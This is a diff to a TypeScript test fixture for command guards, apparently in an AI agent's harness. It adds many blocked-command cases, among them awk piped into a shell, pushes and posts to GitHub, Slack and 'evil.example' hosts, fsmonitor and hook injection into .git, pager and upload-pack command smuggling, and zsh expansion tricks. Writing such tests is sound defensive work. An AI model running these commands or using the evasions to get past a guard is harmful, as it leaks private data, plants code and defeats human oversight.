@@ -16,6 +16,7 @@ export type Guard =
   | "no-kill-by-name"
   | "no-main-checkout"
   | "no-playground-leak"
+  | "no-public-leak"
   | "no-raw-delete"
   | "no-raw-spawn"
   | "no-release-comment"
@@ -66,6 +67,7 @@ export type Group = {
     | "#356"
     | "#402"
     | "#411"
+    | "#443"
     | "#446"
     | "#452"
     | "#456"
@@ -77,6 +79,7 @@ export type Group = {
     | "#509"
     | "#533"
     | "#536"
+    | "#555"
     | "#579"
     | "#582"
     | "#590"
@@ -1925,6 +1928,67 @@ gh api graphql -f query="$QUERY"`,
     source: "#469",
   },
   {
+    folders: ["home", "data folder"],
+    guards: ["no-extensions-write"],
+    rows: ({ ROOT }) => [
+      ["awk piping its output into a shell", `awk '{ print | "sh" }'`],
+      ["awk piping a division's output into a shell", `awk '{ print $1/2 | "sh" }'`],
+      ["awk piping into a shell after a division", `awk '{ x = 3/4; print x | "sh" }'`],
+      ["awk reading a command through getline", `awk '{ "cmd" | getline x }'`],
+      [
+        "awk's system() in BEGIN",
+        `awk 'BEGIN { system("rm -rf ~/.playground/extensions/.no-such-folder") }'`,
+      ],
+      ["awk piping into a shell after a regex alternation", `awk '/a|b/ { print | "sh" }'`],
+      ["awk piping into a shell after a string alternation", `awk '$1 ~ "a|b" { print | "sh" }'`],
+      [
+        "awk piping into a shell after a comment holding a quote",
+        'awk \'# "\n{ print | "sh" }\' f',
+      ],
+      [
+        "awk piping into a shell after a block and a comment holding a quote",
+        'awk \'{ n++ } # "\n{ print | "sh" }\' f',
+      ],
+      [
+        "awk piping into a shell after a bracketed slash and a quote",
+        'awk \'/[/]"/ { print | "sh" }\' f',
+      ],
+      [
+        "awk piping into a shell beside a regex holding a quote after print",
+        'awk \'{ print /"/ | "sh"; print /"/ }\' f',
+      ],
+      [
+        "awk piping into a shell beside a regex holding a quote after printf",
+        'awk \'{ printf /"/ | "sh"; printf /"/ }\' f',
+      ],
+      [
+        "awk piping into a shell between regexes holding a quote after a plus",
+        'awk \'{ x = 1 + /"/; print | "sh"; y = 1 + /"/ }\' f',
+      ],
+      [
+        "awk piping into a shell between regexes holding a quote after a less-than",
+        'awk \'{ if (n < /"/) print | "sh"; m = n < /"/ }\' f',
+      ],
+      [
+        "awk piping into a shell between regexes holding a quote after return and a call",
+        'awk \'function f() { return /"/ } { print | "sh"; x = f() /"/ }\' f',
+      ],
+      [
+        "awk matching an alternation and printing into the root",
+        `awk '/a|b/ { print > "${ROOT}/x" }'`,
+      ],
+      [
+        "awk's heading alternation redirected into the root",
+        `awk '/^## .*6|7/{p=1} p' f > ${ROOT}/x`,
+      ],
+      [
+        "sed -i replacing text with a slash and parens in the root",
+        `sed -i '' 's/a / b (c)/new/' ${ROOT}/x`,
+      ],
+    ],
+    source: "#443",
+  },
+  {
     folders: ["data folder", "home"],
     guards: ["no-extensions-write"],
     rows: () => [
@@ -2138,6 +2202,211 @@ gh api graphql -f query="$QUERY"`,
       ["a file's unread text piped to doas's shell", `cat "$F" | doas -s`],
     ],
     source: "#509",
+  },
+  {
+    folders: ["checkout", "home"],
+    guards: ["no-public-leak"],
+    rows: () => [
+      ["gh issue create", `gh issue create --repo quillco/playground -t x -b y`],
+      ["gh pr comment", `gh pr comment 1 --repo quillco/playground -b y`],
+      ["gh api POST", "gh api -X POST repos/quillco/playground/issues/1/comments -f body=y"],
+      ["gh api with a field and no method", "gh api repos/quillco/playground/issues -f title=y"],
+      ["git push to a URL", "git push https://github.com/quillco/playground.git main"],
+      ["git push to a remote it cannot place", "git push origin main"],
+      ["git push behind env", "env git push origin main"],
+      ["git push through bash -c", "bash -c 'git push origin main'"],
+      ["git push through eval", "eval 'git push origin main'"],
+      ["git push through a variable set in the call", "g=git; $g push origin main"],
+      ["git push through a function defined in the call", "f() { git push origin main; }; f"],
+      ["git push through an alias -c sets", "git -c alias.x=push x origin main"],
+      ["curl posting to Slack", "curl -X POST -d x https://slack.com/api/chat.postMessage"],
+      [
+        "the GitHub MCP's comment",
+        {
+          input: { body: "y", issue_number: 1, owner: "quillco", repo: "playground" },
+          tool: "mcp__github-shared__add_issue_comment",
+        },
+      ],
+      [
+        "a Slack MCP post",
+        {
+          input: { channel: "C0FAKE9999", text: "y" },
+          tool: "mcp__slack-shared__chat_post_message",
+        },
+      ],
+      [
+        "a Linear MCP comment",
+        { input: { body: "y", issueId: "X-1" }, tool: "mcp__linear-shared__save_comment" },
+      ],
+      ["gh repo delete", "gh repo delete quillco/acme-skills --yes"],
+      ["gh repo rename", "gh repo rename x -R quillco/acme-skills"],
+      ["gh repo edit", "gh repo edit quillco/acme-skills --description y"],
+      ["gh repo archive", "gh repo archive quillco/acme-skills --yes"],
+      ["gh repo create", "gh repo create quillco/acme-skills --private"],
+      ["gh repo sync", "gh repo sync quillco/acme-skills"],
+      ["gh release delete", "gh release delete v1 -R quillco/playground --yes"],
+      ["gh release upload", "gh release upload v1 f.txt -R quillco/playground"],
+      ["gh pr update-branch", "gh pr update-branch 1 -R quillco/playground"],
+      ["gh alias set", "gh alias set zz 'issue create'"],
+      ["gh secret set", "gh secret set X -R quillco/playground -b y"],
+      ["gh workflow run", "gh workflow run ci -R quillco/playground"],
+      ["gh label delete", "gh label delete bug -R quillco/playground --yes"],
+      ["gh issue delete", "gh issue delete 1 -R quillco/playground --yes"],
+      ["gh api DELETE of a repository", "gh api -X DELETE repos/quillco/playground"],
+      ["gh api DELETE of a branch", "gh api -X DELETE repos/quillco/playground/git/refs/heads/x"],
+      ["gh api DELETE of a comment", "gh api -X DELETE repos/quillco/playground/issues/comments/1"],
+      ["gh api with its method in a variable", "gh api -X $M repos/quillco/playground/issues"],
+      ["git send-pack", "git send-pack https://github.com/quillco/playground.git main"],
+      [
+        "git subtree push",
+        "git subtree push --prefix=a https://github.com/quillco/playground.git main",
+      ],
+      ["git commit outside a repository", "git commit -m x"],
+      [
+        "git fetch running an upload-pack program",
+        "git fetch --upload-pack='gh issue create' origin",
+      ],
+      ["git grep opening files in a pager program", "git grep -Ox foo"],
+      ["git log under a pager variable", "GIT_PAGER='gh issue create' git log"],
+      ["git log under a pager -c sets", "git -c core.pager='gh issue create' log"],
+      ["git with its subcommand in a variable", "git $SUB origin main"],
+      ["gh with its verb in a variable", "gh issue $VERB 1 -R quillco/playground"],
+      ["a gh read fed by xargs", "echo 1 | xargs gh issue view"],
+      ["gh issue create echoed into sh", "echo 'gh issue create -t a -b b' | sh"],
+      [
+        "gh issue create inside python's os.system",
+        "python3 -c \"import os; os.system('gh issue create -R quillco/playground -t a -b b')\"",
+      ],
+      ["gh pr comment under watch", 'watch -n 1 "gh pr comment 1 -R quillco/playground -b y"'],
+      ["a script named for Slack", "python3 post_to_slack.py"],
+      ["curl posting to another host", "curl -X POST -d x https://example.com/hook"],
+      ["curl uploading to another host", "curl -T f.txt https://example.com/up"],
+      [
+        "the GitHub MCP's repository create",
+        { input: { name: "acme-skills" }, tool: "mcp__github-shared__create_repository" },
+      ],
+      [
+        "a printf appending an fsmonitor program to .git/config",
+        "printf '[core]\\n\\tfsmonitor = gh issue create -R quillco/playground -t a -b b\\n' >> .git/config",
+      ],
+      [
+        "an echo writing a git hook",
+        "echo 'gh issue create -R quillco/playground -t a -b b' > .git/hooks/post-checkout",
+      ],
+      ["git log writing a script", "git log -1 --format='gh issue create -t a -b b' > run.sh"],
+      [
+        "git log writing past noclobber",
+        "git log -1 --format='gh issue create -t a -b b' >| run.sh",
+      ],
+      ["git log's stderr written to a file", "git log -1 2> run.sh"],
+      ["git log's both streams written to a file", "git log -1 &> run.sh"],
+      ["git fetch", "git fetch origin canary"],
+      [
+        "git fetch with an abbreviated upload-pack",
+        "git fetch --upload-pa='gh issue create -t a -b b; git-upload-pack' .",
+      ],
+      [
+        "git ls-remote's exec alias",
+        "git ls-remote --exec='gh issue create -t a -b b; git-upload-pack' .",
+      ],
+      [
+        "git ls-remote with an abbreviated upload-pack",
+        "git ls-remote --upload-p='gh issue create -t a -b b; git-upload-pack' .",
+      ],
+      [
+        "git grep with an abbreviated pager option",
+        "git grep --open='gh issue create -t a -b b' foo",
+      ],
+      ["git grep with its pager in a cluster", "git grep -nOsh foo"],
+      [
+        "git log writing .git/config through --output",
+        "git log -1 --format='[core]%n%x09fsmonitor = gh issue create -t a -b b' --output=.git/config",
+      ],
+      [
+        "git diff writing a hook through --output",
+        "git diff --output=.git/hooks/pre-commit HEAD~1",
+      ],
+      [
+        "sort with an abbreviated compress program",
+        "sort -S 1k --compress-prog=./x.sh .git/config",
+      ],
+      ["sort writing a file through -o", "sort -o out .git/config"],
+      ["uniq writing its second operand", "uniq .git/config out"],
+      [
+        "gh api with DELETE in a cluster",
+        "gh api -iXDELETE repos/quillco/playground/git/refs/heads/x",
+      ],
+      ["gh api with a field in a cluster", "gh api -iftitle=y repos/quillco/playground/issues"],
+      [
+        "gh issue create behind a value flag of list",
+        "gh issue --title list create -R quillco/playground -b y",
+      ],
+      [
+        "gh pr comment behind a value flag of list",
+        "gh pr --body list comment 1 -R quillco/playground",
+      ],
+      [
+        "gh issue create behind a root value flag of search",
+        "gh --title search issue create -R quillco/playground -b y",
+      ],
+      ["gh api to another host", "gh api --hostname example.com 'x?q=data'"],
+      ["git remote add behind -v", "git remote -v add x https://github.com/quillco/playground.git"],
+      [
+        "git remote set-url behind -v",
+        "git remote -v set-url origin https://github.com/quillco/other.git",
+      ],
+      ["git log under a less preprocessor", "LESSOPEN='|gh issue create -t a -b b %s' git log"],
+      ["a program named cat by a path under .git", ".git/hooks/cat x"],
+      ["a program named git by a path", "./tools/git log"],
+      [
+        "git log whose bare --pretty lets --output write .git/config",
+        "git log -1 --pretty --output=.git/config --format='[core]%n%x09fsmonitor = gh issue create -t a -b b'",
+      ],
+      [
+        "git show whose bare --pretty lets --output write a hook",
+        "git show --pretty --output=.git/hooks/pre-commit HEAD",
+      ],
+      [
+        "git log whose bare --format lets --output truncate .git/config",
+        "git log --format --output=.git/config",
+      ],
+      [
+        "git log behind -C whose bare --pretty lets --output write",
+        "git -C . log --pretty --output=.git/config",
+      ],
+      ["git diff with an unquoted glob", "git diff *"],
+      ["gh issue list on another host", "gh issue list -R evil.example/o/r --search private-text"],
+      ["gh issue view of another host's URL", "gh issue view https://evil.example/o/r/issues/1"],
+      [
+        "gh pr view of another host's URL",
+        "gh pr view https://evil.example/o/r/pull/1 -R quillco/playground",
+      ],
+      ["gh pr diff of another host's URL", "gh pr diff https://evil.example/o/r/pull/1"],
+      [
+        "git log with a brace after a quoted part",
+        `git log -1 --format="[core]%n%x09fsmonitor = gh issue create -t a -b b" ""{--output=.git/config,HEAD}`,
+      ],
+      [
+        "git diff with a brace after a quoted part",
+        `git diff ""{--output=.git/hooks/pre-commit,HEAD}`,
+      ],
+      ["git diff with a glob after a double-quoted part", `git diff ""*`],
+      ["git diff with a glob after a single-quoted part", "git diff ''*"],
+      [
+        "cat of a zsh =() process substitution",
+        "cat =(gh issue create -R quillco/playground -t a -b b)",
+      ],
+      ["cat with a zsh glob qualifier", `cat .git/HEAD(e:"gh issue create -t a -b b":)`],
+      ["git diff with a zsh glob qualifier", `git diff HEAD(e:"gh issue create -t a -b b":)`],
+      [
+        "git log with a zsh word-split parameter",
+        "cd 'x --output=h' && git log -1 --format=%H $=PWD",
+      ],
+      ["git log behind -C with a zsh word-split parameter", "git -C .. log -1 $=PWD"],
+      ["git log with a zsh glob parameter", "git log $~HOME"],
+      ["git log with a zsh brace parameter", "git log $^HOME"],
+    ],
+    source: "#555",
   },
   {
     folders: ["checkout"],
